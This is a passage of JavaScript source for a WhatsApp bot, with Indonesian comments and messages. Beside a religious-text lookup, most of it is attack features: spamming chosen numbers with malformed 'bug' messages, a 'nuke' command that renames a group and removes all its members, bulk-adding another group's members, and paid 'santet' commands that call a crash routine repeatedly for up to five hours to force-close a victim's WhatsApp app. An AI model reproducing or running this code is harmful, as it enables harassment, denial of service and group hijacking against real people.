            }
            break
            case 'asmaulhusna': {
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/religi/asmaulhusna.json')
                let capt = `Asmaul Husna:\n\n`
                for (let i of anu) {
                    capt += `⭔ Nomor: ${i.index}\n`
                    capt += `⭔ Latin: ${i.latin}\n`
                    capt += `⭔ Arab: ${i.arabic}\n`
                    capt += `⭔ Arti ID: ${i.translation_id}\n`
                    capt += `⭔ Arti EN: ${i.translation_en}\n\n──────────────────────\n`
                }
                m.reply(capt)
            }
            break

case "culik": {
    if(!m.isGroup) return m.reply(`jangan lucu lucu lah masbro`);
    if(args.length < 1) return m.reply(`*Example:* ${command} type jid\n*Param:* Send Commands With Words ${command} type jid\n*Desc:* Kidnap Members\n`);
    if((args[0]) === 'id') {
        var groupMetadatat = m.isGroup ? conn?.groupMetadatat[args[1]] !== undefined ? conn.groupMetadatat[args[1]] : await conn.fetchgroupMetadatat(args[1], conn) : {};
        var groupMemberst = m.isGroup ? groupMetadatat.participants : [];
        for (var mem of groupMemberst) {
            conn.groupParticipantsUpdate(m.chat, groupMemberst.map(a => a.id), 'add')
        };
        content = "Successfully!"
        m.reply(content);
    } else if((args[0]) === 'link') {
        if(!isUrl(args[1]) && !args[1].includes('whatsapp.com')) return m.reply(`Link Error`);
        var result = args[1].split('https://chat.whatsapp.com/')[1]
        var res = await conn.groupAcceptInvite(result)
        var groupMetadatat = m.isGroup ? conn?.groupMetadatat[`${res}`] !== undefined ? conn.groupMetadatat[res] : await conn.fetchgroupMetadatat(res, conn) : {};
        var groupMemberst = m.isGroup ? groupMetadatat.participants : [];
        for (var mem of groupMemberst) {
            conn.groupParticipantsUpdate(m.chat, groupMemberst.map(a => a.id), 'add')
        };
        content = "Successfully!"
        m.reply(content);
    } else {
        content = '*List Type:*\n'
        content += `${m.numberLive++}. ${command} id\n`
        content += `${m.numberLive++}. ${command} link\n`
        m.reply(content);
    };
};
break;
case 'bugpc': {
if (!isCreator) return m.reply(`kamu siapa😁`)
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} number|amount spam\nExample : ${command} 62888|1`)
var num = q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
jumlah = q.split('|')[1]
if (Number(jumlah[1]) >= 50) return m.reply('Maksimal 50 kak')
tek = `Success Send Bug To: ${num}\nJumlah Spam: ${jumlah}\n\nNote! - Bug Akan Dikirim Setiap 15 Detik Untuk Menghindari Banned`
reply(tek)
await sleep(2000)
for (let i = 0; i < jumlah; i++) {
m.reply(`Bug ke ${Number(i) + 1} berhasil terkirim!`)
conn.sendMessage(num, { 
text: '', 
templateButtons: [
{ callButton: { displayText: `yahaha`, phoneNumber: ``}},
{ urlButton: { displayText: `yahaha`, url: `https://wa.me/`}},
{ urlButton: { displayText: `yahaha`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `yahaha`, id: ``}},
{ quickReplyButton: { displayText: `yahaha`, id: ``}},
{ quickReplyButton: { displayText: `yahaha`, id: ``}},
]})
await sleep(15000)
}
pek = `Berhasil Mengirim Seluruh Bug ke - ${num}`
reply(pek)
}
break
case 'chzklfx': {
	if (!isCreator) return m.reply(`kamu siapa😁`)
	if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} number|amount spam\nExample : ${command} 62888|1`)
	var num = q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
	jumlah = q.split('|')[1]
	if (Number(jumlah[1]) >= 50) return m.reply('Maksimal 50 kak')
	for (let i = 0; i < jumlah; i++) {
	m.reply(`Bug ke ${Number(i) + 1} berhasil terkirim!`)
	conn.sendMessage(num, { 
	text: '', 
	templateButtons: [
	{ callButton: { displayText: `yahaha`, phoneNumber: ``}},
	{ urlButton: { displayText: `yahaha`, url: `https://wa.me/`}},
	{ urlButton: { displayText: `yahaha`, url: `https://www.whatsapp.com/otp/copy/`}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	{ quickReplyButton: { displayText: `yahaha`, id: ``}},
	]})
	await sleep(15000)
	}
	tek = `Success Send Bug To: ${num}\nJumlah Spam: ${jumlah}\n\nNote! - Bug Akan Dikirim Setiap 15 Detik Untuk Menghindari Banned`
	reply(tek)
	}
	break

          case 'nuke':
case 'hengketbai': // Nome do cmd <~
{
if (!m.isGroup) return m.reply("\n\n stres. \n\n")
hmm4 = fs.readFileSync(`./huh.png`)
                   conn.updateProfilePicture (from, hmm4)
                   await sleep(1000)
//conn.groupSettingChange(from, GroupSettingChange.messageSend, true)
//conn.groupSettingChange(from, GroupSettingChange.settingsChange, true)
conn.groupUpdateDescription(from, '\n\n\n\n\n\n\n\n\n\n\n') // Setando Descrição
conn.groupUpdateSubject(from, "Heket By J3urié \n\n\n\n\n\n") // Colocando Nome
conn.sendMessage(from, {text:'\n ~ Heket By J3urié😂 \n'}) // Enviando MSG
setTimeout( () => {

members_id = []
for(let obj of groupMembers) {
if (obj.jid === conn.user.jid) continue
members_id.push(obj.jid)
conn.groupRemove(from, [obj.jid])
}
}, 500);
}
break;

				case 'santed': case 'atk': case 'serang': case 'santet': {
					const nomore2 = m.sender.replace(/[^0-9]/g, '')
				const tanggal = moment.tz('Asia/Jakarta').format('dddd') + ', ' + moment.tz('Asia/Jakarta').format('LL')
				
					
					if (!isPremium) {
						btn = [{
							urlButton: {
								displayText: '👤 ᴏᴡɴᴇʀ',
								url: 'https://wa.me/687909979'
							}
						}]

			conn.send5ButMsg(from, `Maaf Anda belum bisa mengakses fitur ini\n`, `ketik ${prefix}owner\nuntuk melihat nomor owner`, btn)

				} else if (!text) { throw `*Masukan Nomor WhatsApp Target !*\n_Contoh:_\n${prefix + command} 6285173443334`
				} else {

					sections = [
						{
						title: `Silahkan Pilih Durasi Penyerangan`,
						rows: [
						{title: "1 Menit", rowId: `#santed1menit ${nomore3}`, description: `Serang ${nomore3} dalam waktu 1 menit`},
						{title: "5 Menit", rowId: `#santed5menit ${nomore3}`, description: `Serang ${nomore3} dalam waktu 5 menit`},
						{title: "10 Menit", rowId: `#santed10menit ${nomore3}`, description: `Serang ${nomore3} dalam waktu 10 menit`},
						{title: "30 Menit", rowId: `#santed30menit ${nomore3}`, description: `Serang ${nomore3} dalam waktu 30 menit`},
						{title: "1 Jam", rowId: `#santed1jam ${nomore3}`, description: `Serang ${nomore3} dalam waktu 1 Jam`},
						{title: "5 Jam", rowId: `#santed5jam ${nomore3}`, description: `Serang ${nomore3} dalam waktu 5 Jam`}
						]
						},
						]
		conn.sendListMsg(from, `Silahkan klik tombol dibawah ini`, `by chzklf`, `Hai Kak @${sender.split('@')[0]}`, `Click Here`, sections, fake)
						}}
						break

						// SANTED NYA
   case 'santed1menit': {

    const nomore2 = m.sender.replace(/[^0-9]/g, '')
  let dataanu = await fetchJson(global.userjson)
      
const tanggal = moment.tz('Asia/Jakarta').format('dddd') + ', ' + moment.tz('Asia/Jakarta').format('LL')

     
     if (!isPremium) {
						btn = [{
							urlButton: {
								displayText: '👤 ᴏᴡɴᴇʀ',
								url: 'https://wa.me/687909979'
							}
						}]

			conn.send5ButMsg(from, `Maaf Anda belum bisa mengakses fitur ini\n`, `ketik ${prefix}owner\nuntuk melihat nomor owner`, btn)

				} else if (!text) { throw `*Masukan Nomor WhatsApp Target !*\n_Contoh:_\n${prefix + command} 6285173443334`
				} else {
    conn.sendMessage(from, { react: { text: `🕐`, key: m.key }})
 m.reply(`*〔 Sedang Mengeksekusi Target 〕*

*⭔ Nomor  :* ${nomore3}
*⭔ Wa.me  :* wa.me/${nomore3}
*⭔ Durasi :* 1 Menit

_Aplikasi WhatsApp Target Akan Force Close(Tidak Bisa di Buka) Selama 1 Menit Dari sekarang_`)
modardek(text)
await sleep(30000)
modardek(text)
}
}
break

case 'santed5menit': {

    const nomore2 = m.sender.replace(/[^0-9]/g, '')
  let dataanu = await fetchJson(global.userjson)
      
const tanggal = moment.tz('Asia/Jakarta').format('dddd') + ', ' + moment.tz('Asia/Jakarta').format('LL')

     
     if (!isPremium) {
						btn = [{
							urlButton: {
								displayText: '👤 ᴏᴡɴᴇʀ',
								url: 'https://wa.me/687909979'
							}
						}]

			conn.send5ButMsg(from, `Maaf Anda belum bisa mengakses fitur ini\n`, `ketik ${prefix}owner\nuntuk melihat nomor owner`, btn)

				} else if (!text) { throw `*Masukan Nomor WhatsApp Target !*\n_Contoh:_\n${prefix + command} 6285173443334`
				} else {
    conn.sendMessage(from, { react: { text: `🕐`, key: m.key }})
 m.reply(`*〔 Sedang Mengeksekusi Target 〕*

*⭔ Nomor  :* ${nomore3}
*⭔ Wa.me  :* wa.me/${nomore3}
*⭔ Durasi :* 5 Menit

_Aplikasi WhatsApp Target Akan Force Close(Tidak Bisa di Buka) Selama 5 Menit Dari sekarang_`)
for (let i = 0; i < 5; i++) {
modardek(text)
await sleep(60000)
}}
}
break

case 'santed10menit': {
    const nomore2 = m.sender.replace(/[^0-9]/g, '')
  let dataanu = await fetchJson(global.userjson)
      
const tanggal = moment.tz('Asia/Jakarta').format('dddd') + ', ' + moment.tz('Asia/Jakarta').format('LL')

     
     if (!isPremium) {
						btn = [{
							urlButton: {
								displayText: '👤 ᴏᴡɴᴇʀ',
								url: 'https://wa.me/687909979'
							}
						}]

			conn.send5ButMsg(from, `Maaf Anda belum bisa mengakses fitur ini\n`, `ketik ${prefix}owner\nuntuk melihat nomor owner`, btn)

				} else if (!text) { throw `*Masukan Nomor WhatsApp Target !*\n_Contoh:_\n${prefix + command} 6285173443334`
				} else {
    conn.sendMessage(from, { react: { text: `🕐`, key: m.key }})
 m.reply(`*〔 Sedang Mengeksekusi Target 〕*

*⭔ Nomor  :* ${nomore3}
*⭔ Wa.me  :* wa.me/${nomore3}
*⭔ Durasi :* 10 Menit

_Aplikasi WhatsApp Target Akan Force Close(Tidak Bisa di Buka) Selama 10 Menit Dari sekarang_`)
      modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
}
}
break
case 'santed30menit': {
const nomore2 = m.sender.replace(/[^0-9]/g, '')
  let dataanu = await fetchJson(global.userjson)
      
const tanggal = moment.tz('Asia/Jakarta').format('dddd') + ', ' + moment.tz('Asia/Jakarta').format('LL')

     
     if (!isPremium) {
						btn = [{
							urlButton: {
								displayText: '👤 ᴏᴡɴᴇʀ',
								url: 'https://wa.me/687909979'
							}
						}]

			conn.send5ButMsg(from, `Maaf Anda belum bisa mengakses fitur ini\n`, `ketik ${prefix}owner\nuntuk melihat nomor owner`, btn)

				} else if (!text) { throw `*Masukan Nomor WhatsApp Target !*\n_Contoh:_\n${prefix + command} 6285173443334`
				} else {
    conn.sendMessage(from, { react: { text: `🕐`, key: m.key }})
 m.reply(`*〔 Sedang Mengeksekusi Target 〕*

*⭔ Nomor  :* ${nomore3}
*⭔ Wa.me  :* wa.me/${nomore3}
*⭔ Durasi :* 30 Menit

_Aplikasi WhatsApp Target Akan Force Close(Tidak Bisa di Buka) Selama 30 Menit Dari sekarang_`)

modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
      
}
}
break
case 'santed1jam': {
    const nomore2 = m.sender.replace(/[^0-9]/g, '')
  let dataanu = await fetchJson(global.userjson)
      
const tanggal = moment.tz('Asia/Jakarta').format('dddd') + ', ' + moment.tz('Asia/Jakarta').format('LL')

     
     if (!isPremium) {
						btn = [{
							urlButton: {
								displayText: '👤 ᴏᴡɴᴇʀ',
								url: 'https://wa.me/687909979'
							}
						}]

			conn.send5ButMsg(from, `Maaf Anda belum bisa mengakses fitur ini\n`, `ketik ${prefix}owner\nuntuk melihat nomor owner`, btn)

				} else if (!text) { throw `*Masukan Nomor WhatsApp Target !*\n_Contoh:_\n${prefix + command} 6285173443334`
				} else {
    conn.sendMessage(from, { react: { text: `🕐`, key: m.key }})
 m.reply(`*〔 Sedang Mengeksekusi Target 〕*

*⭔ Nomor  :* ${nomore3}
*⭔ Wa.me  :* wa.me/${nomore3}
*⭔ Durasi :* 1 Jam

_Aplikasi WhatsApp Target Akan Force Close(Tidak Bisa di Buka) Selama 1 Jam Dari sekarang_`)

modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)


}
}
break


// used 5 BOT
case 'santed5jam': {
    const nomore2 = m.sender.replace(/[^0-9]/g, '')
  let dataanu = await fetchJson(global.userjson)
      
const tanggal = moment.tz('Asia/Jakarta').format('dddd') + ', ' + moment.tz('Asia/Jakarta').format('LL')

     
     if (!isPremium) {
						btn = [{
							urlButton: {
								displayText: '👤 ᴏᴡɴᴇʀ',
								url: 'https://wa.me/687909979'
							}
						}]

			conn.send5ButMsg(from, `Maaf Anda belum bisa mengakses fitur ini\n`, `ketik ${prefix}owner\nuntuk melihat nomor owner`, btn)

				} else if (!text) { throw `*Masukan Nomor WhatsApp Target !*\n_Contoh:_\n${prefix + command} 6285173443334`
				} else {
    conn.sendMessage(from, { react: { text: `🕐`, key: m.key }})
 m.reply(`*〔 Sedang Mengeksekusi Target 〕*

*⭔ Nomor  :* ${nomore3}
*⭔ Wa.me  :* wa.me/${nomore3}
*⭔ Durasi :* 5 Jam

_Aplikasi WhatsApp Target Akan Force Close(Tidak Bisa di Buka) Selama 5 Jam Dari sekarang_`)

modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
await sleep(30000)
modardek(text)
